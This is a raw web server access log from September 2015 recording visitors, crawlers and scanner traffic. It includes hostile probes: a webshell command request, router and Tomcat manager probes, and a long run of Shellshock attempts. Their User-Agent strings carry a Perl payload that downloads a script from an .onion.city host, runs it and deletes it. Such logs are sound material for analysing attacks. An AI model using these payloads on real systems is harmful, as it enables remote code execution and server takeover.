54.153.15.150 - - [06/Sep/2015:22:36:08 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.71.67 - - [06/Sep/2015:23:36:56 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
104.192.0.226 - - [07/Sep/2015:00:12:06 -0400] "GET /admin/bootstrap.inc.php?mgp=danc3Uf@t&c=whoami HTTP/1.0" 404 14 "-" "-"
54.153.74.0 - - [07/Sep/2015:00:37:29 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
68.229.10.95 - - [07/Sep/2015:01:48:50 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/3093 CFNetwork/760.0.5 Darwin/15.0.0 (x86_64)"
68.229.10.95 - - [07/Sep/2015:01:48:50 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/3093 CFNetwork/760.0.5 Darwin/15.0.0 (x86_64)"
68.229.10.95 - - [07/Sep/2015:01:48:51 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 14 "-" "Mail/3093 CFNetwork/760.0.5 Darwin/15.0.0 (x86_64)"
68.229.10.95 - - [07/Sep/2015:01:48:51 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 14 "-" "Mail/3093 CFNetwork/760.0.5 Darwin/15.0.0 (x86_64)"
68.229.10.95 - - [07/Sep/2015:01:48:51 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "-" "Mail/3093 CFNetwork/760.0.5 Darwin/15.0.0 (x86_64)"
66.249.84.168 - - [07/Sep/2015:03:38:04 -0400] "GET / HTTP/1.1" 200 2930 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CCEQFjAB&url=http%3A%2F%2Faid.safesleepaid.eu%2F&ei=3D7tVcv3HeuyggSQjAE&usg=AFQjCNGwCWbJWxYnlvo0BJbkegaU3yyl6g" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
66.249.84.162 - - [07/Sep/2015:03:38:04 -0400] "GET /static/css/aresou.css HTTP/1.1" 200 462 "http://aid.safesleepaid.eu/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
93.174.93.33 - - [07/Sep/2015:06:17:48 -0400] "GET / HTTP/1.0" 200 2930 "-" "-"
61.135.190.199 - - [07/Sep/2015:09:38:31 -0400] "GET / HTTP/1.0" 200 2930 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
61.135.190.199 - - [07/Sep/2015:09:38:32 -0400] "GET /static/css/aresou.css HTTP/1.0" 200 462 "http://168.235.85.21/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
91.196.50.33 - - [07/Sep/2015:10:24:12 -0400] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
71.198.47.206 - - [07/Sep/2015:12:37:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
71.198.47.206 - - [07/Sep/2015:12:37:05 -0400] "GET /static/css/aresou.css HTTP/1.1" 200 462 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
71.198.47.206 - - [07/Sep/2015:12:37:05 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
46.172.71.251 - - [07/Sep/2015:20:34:25 -0400] "GET /rom-0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.206.17.64 - - [08/Sep/2015:09:28:08 -0400] "GET / HTTP/1.1" 200 892 "http://mcc.godaddy.com/park/M3IlLKWeM3ylnKW5YzSlMj==/fe/ozIlLJWcov5upzp=" "WWW-Mechanize/1.74"
182.118.54.83 - - [08/Sep/2015:14:21:02 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
141.212.121.144 - - [08/Sep/2015:15:19:58 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/5.0 zgrab/0.x"
50.204.132.195 - - [08/Sep/2015:15:20:01 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
50.204.132.195 - - [08/Sep/2015:15:20:01 -0400] "GET /static/css/aresou.css HTTP/1.1" 200 462 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
54.187.12.191 - - [08/Sep/2015:15:33:50 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
45.55.63.252 - - [08/Sep/2015:15:52:24 -0400] "GET / HTTP/1.0" 200 2930 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
137.226.113.7 - - [08/Sep/2015:16:32:32 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
137.226.113.7 - - [08/Sep/2015:16:32:32 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
200.230.195.129 - - [08/Sep/2015:17:30:31 -0400] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
61.135.190.72 - - [08/Sep/2015:17:50:59 -0400] "GET / HTTP/1.0" 200 2930 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
61.135.190.201 - - [08/Sep/2015:17:51:00 -0400] "GET /static/css/aresou.css HTTP/1.0" 200 462 "http://168.235.85.21/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
180.76.15.29 - - [08/Sep/2015:18:00:43 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.161 - - [08/Sep/2015:18:07:36 -0400] "GET /robots.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
182.118.53.135 - - [08/Sep/2015:18:15:44 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
137.226.113.7 - - [08/Sep/2015:18:25:33 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
137.226.113.7 - - [08/Sep/2015:18:25:33 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
192.99.150.120 - - [08/Sep/2015:19:39:45 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0"
91.196.50.33 - - [08/Sep/2015:20:35:58 -0400] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
45.55.49.155 - - [08/Sep/2015:20:43:17 -0400] "HEAD / HTTP/1.0" 405 0 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
54.233.80.105 - - [08/Sep/2015:20:55:05 -0400] "GET / HTTP/1.1" 200 892 "http://www.resultatfootendirect.net/" "WWW-Mechanize/1.74"
45.55.175.107 - - [09/Sep/2015:05:28:33 -0400] "HEAD / HTTP/1.0" 405 0 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
104.43.199.148 - - [09/Sep/2015:07:24:52 -0400] "GET / HTTP/1.1" 200 892 "-" "python-requests/2.7.0 CPython/2.7.8 Linux/3.16.0-30-generic"
222.186.56.107 - - [09/Sep/2015:12:50:13 -0400] "GET http://www.baidu.com/ HTTP/1.1" 200 2930 "-" "HttpClient"
222.186.56.107 - - [09/Sep/2015:12:50:36 -0400] "GET http://www.baidu.com/ HTTP/1.1" 200 2930 "-" "HttpClient"
73.202.164.195 - - [09/Sep/2015:18:43:19 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
73.202.164.195 - - [09/Sep/2015:18:43:19 -0400] "GET /static/css/aresou.css HTTP/1.1" 304 0 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
73.202.164.195 - - [09/Sep/2015:18:43:19 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
141.212.122.50 - - [09/Sep/2015:21:12:39 -0400] "CONNECT proxytest.zmap.io:80 HTTP/1.1" 400 181 "-" "-"
180.76.15.150 - - [09/Sep/2015:23:46:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
91.196.50.33 - - [10/Sep/2015:05:22:22 -0400] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
61.135.190.199 - - [10/Sep/2015:06:55:54 -0400] "GET / HTTP/1.0" 200 2930 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
61.135.190.199 - - [10/Sep/2015:06:55:54 -0400] "GET /static/css/aresou.css HTTP/1.0" 200 462 "http://168.235.85.21/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
65.31.208.182 - - [10/Sep/2015:10:48:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
65.31.208.182 - - [10/Sep/2015:10:48:06 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
65.31.208.182 - - [10/Sep/2015:10:48:06 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 14 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
65.31.208.182 - - [10/Sep/2015:10:48:06 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 14 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
65.31.208.182 - - [10/Sep/2015:10:48:07 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
192.99.150.120 - - [10/Sep/2015:12:37:20 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0"
180.234.32.85 - - [10/Sep/2015:12:45:38 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0"
182.118.60.87 - - [10/Sep/2015:13:41:14 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
46.172.71.251 - - [10/Sep/2015:13:51:16 -0400] "GET /rom-0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.187.12.191 - - [10/Sep/2015:15:38:41 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
218.241.108.148 - - [10/Sep/2015:15:42:32 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; iCafeMedia; .NET CLR 2.0.50727; CIBA)"
182.118.60.99 - - [10/Sep/2015:18:42:13 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
185.25.151.159 - - [10/Sep/2015:21:26:08 -0400] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
180.76.15.149 - - [11/Sep/2015:05:27:01 -0400] "GET /blog/3 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.139 - - [11/Sep/2015:08:41:15 -0400] "GET /blog/1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
46.172.71.251 - - [11/Sep/2015:12:52:52 -0400] "GET /rom-0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
72.94.52.5 - - [11/Sep/2015:13:30:00 -0400] "GET HTTP/1.1 HTTP/1.1" 400 181 "-" "-"
72.94.52.5 - - [11/Sep/2015:13:30:03 -0400] "GET / HTTP/1.1" 200 892 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:03 -0400] "GET /main.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:03 -0400] "GET /info.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:03 -0400] "GET /index.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /admin.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /administrator.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /cgi-bin/report.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /cgi-bin/webmap.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /cgi-sys/helpdesk.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:04 -0400] "GET /cgi-bin/register.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/download.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/shop.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-sys/signup.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/profile.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/about_us.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/php.fcgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:05 -0400] "GET /cgi-bin/calendar.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/download.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/light_board.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/main.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/search.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/test.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/file_up.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:06 -0400] "GET /cgi-bin/concept.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/query.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/counter.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/kontakt.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/backup.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/firewall.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
